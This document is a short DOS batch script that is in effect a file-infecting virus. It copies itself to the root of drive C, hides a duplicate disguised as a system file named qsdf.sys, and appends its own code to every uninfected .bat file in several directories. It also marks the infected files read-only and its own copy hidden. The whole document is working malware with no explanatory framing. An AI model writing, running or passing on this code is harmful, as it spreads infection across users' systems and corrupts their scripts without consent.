@echo off
if %2==aaa2_inf goto aaa2_inf
if not exist c:\aaa2.bat copy aaa2.bat c:\ >nul
if not exist c:\windows\system\qsdf.sys type c:\aaa2.bat > c:\windows\system\qsdf.sys
if not exist c:\aaa2.bat type c:\windows\system\qsdf.sys > c:\aaa2.bat
if not exist c:\aaa2.bat copy %0.bat c:\aaa2.bat >nul
for %%a in (..\*.bat *.bat c:\*.bat c:\windows\*.bat c:\windows\command\*.bat e:\*.bat) do call C:\aaa2.bat %%a aaa2_inf
goto fin
:aaa2_inf
find "aaa2"<%1>nul
if not errorlevel 1 goto fin

type c:\aaa2.bat>>%1
attrib %1 +r
:fin
attrib c:\aaa2.bat +h +r
